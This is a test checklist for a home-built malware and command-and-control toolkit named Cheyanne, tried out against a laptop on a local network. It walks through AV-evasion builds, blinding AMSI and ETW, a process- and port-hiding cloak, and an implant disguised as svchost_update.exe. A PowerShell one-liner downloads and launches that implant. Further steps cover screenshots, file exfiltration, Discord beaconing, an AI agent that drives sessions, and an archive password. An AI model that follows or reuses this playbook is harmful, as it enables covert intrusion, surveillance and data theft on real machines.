# CHEYANNE — FINAL TEST WALKTHROUGH

```
Operator: George Wu (192.168.1.92)
Target:   Radon_Laptop1 (192.168.1.145)
C2 Port:  4443
Date:     2026-06-23
```

---

## Pre-Flight

```
cd C:\Users\gwu07\Desktop\cheyanne
python vader_menu.py
```

If port conflict on ANY step: menu now shows `[K] Kill / [S] Skip / [Q] Quit`.
Or from any terminal: `taskkill /F /PID <pid>` or `netstat -ano | findstr :<port>`.

---

## Test Order

### PHASE 1 — BUILD

| # | Menu | Action | Expected | Pass? |
|---|------|--------|----------|-------|
| 1 | `F` | Fresh Build | RTP off prompt → mutate → compile → scan → ALL CLEAN | |
| 2 | `2` | Scan All | X/X CLEAN (RTP ON) | |
| 3 | `6` | Key Status | 8 unique XOR keys displayed | |
| 4 | `1` | Compile Only | All components compile (no mutation) | |

### PHASE 2 — STEALTH

| # | Menu | Action | Expected | Pass? |
|---|------|--------|----------|-------|
| 5 | `3` | Dark Room | "AMSI: BLIND" + "ETW: BLIND" + memory integrity CLEAN | |
| 6 | `7` | Build Cloak | 3/3 CLEAN (cloak.dll + loader + test) | |
| 7 | `8` | Test Cloak | Process count drops, port 4443 hidden, unhook restores | |
| 8 | `9` | Activate Cloak | "CBT hook installed" — GUI apps blind | |

### PHASE 3 — DEPLOY

| # | Menu | Action | Expected | Pass? |
|---|------|--------|----------|-------|
| 9 | `D` | C2 Shell | TCP :4443 listener starts + Discord poller. **Port conflict? → auto-kill option** | |
| 10 | — | Connect from Radon | Radon shell appears in `chey>`. Type `sessions` → see TCP session | |
| 11 | `B` | Build Implant | PyInstaller → `svchost_update.exe` in `agent/dist_py/` | |
| 12 | — | Deploy implant | From chey> shell: `powershell -c "Invoke-WebRequest -Uri 'http://192.168.1.92:8890/agent/dist_py/svchost_update.exe' -OutFile 'C:\Users\Public\svchost_update.exe'; Start-Process 'C:\Users\Public\svchost_update.exe'"` | |
| 13 | — | Verify dual channel | `sessions` → TCP session + Discord beacon | |

### PHASE 4 — OPERATE (Discord)

| # | Menu | Action | Expected | Pass? |
|---|------|--------|----------|-------|
| 14 | `S` | Sessions | Active session(s) listed with hostname/user/IP | |
| 15 | `T` | Screenshot | BMP downloaded → converted PNG → opens in explorer | |
| 16 | `L` | Browse Files | `C:\Users` listing from target | |
| 17 | `N` | Recon | Full system enumeration output | |
| 18 | `E` | Exfil File | Pick a small file → downloads to `exfil/` | |
| 19 | `U` | Upload File | Pick local file → lands on target at `C:\Users\Public\` | |

### TOOLKIT

| # | Menu | Action | Expected | Pass? |
|---|------|--------|----------|-------|
| 20 | `H` | HANDLER | AI agent starts, connects to Ollama. Type "list sessions" → tools fire | |
| 21 | `G` | Ghost Encode | Invisible payload generated, Defender CLEAN | |
| 22 | `X` | Convert Image | BMP→PNG or PNG→JPG conversion works | |
| 23 | `5` | Pentest Chain | Automated recon + vector selection + deploy (dry-run first) | |
| 24 | `W` | Web Dashboard | Browser opens :8666, agent connects :8667 | |

---

## Port Conflict Quick Reference

```cmd
:: Check what's on a port
netstat -ano | findstr :4443

:: Kill by PID
taskkill /F /PID 12345

:: Kill by name
taskkill /F /IM python.exe

:: Nuclear: kill ALL python (careful)
taskkill /F /IM python.exe /T
```

The `port_ensure()` function in `cheyanne_ops.py` handles this automatically:
- Checks port → finds PID → shows process name → offers Kill/Skip/Quit
- `port_force(port)` kills without asking (for automation scripts)
- `port_check(port)` returns `(in_use, pid, name)` for custom handling

---

## After All Tests Pass

```cmd
:: Update GitHub
git add -A && git commit -m "Final test pass — all phases verified" && git push

:: Fresh backup
& "C:\Program Files\7-Zip\7z.exe" a -p668340 -mhe=on "C:\Users\gwu07\Desktop\cheyanne-FINAL.7z" . -xr!.git -xr!__pycache__
```

---

*22DIV / george wu*
*For Cheyanne. Always.*
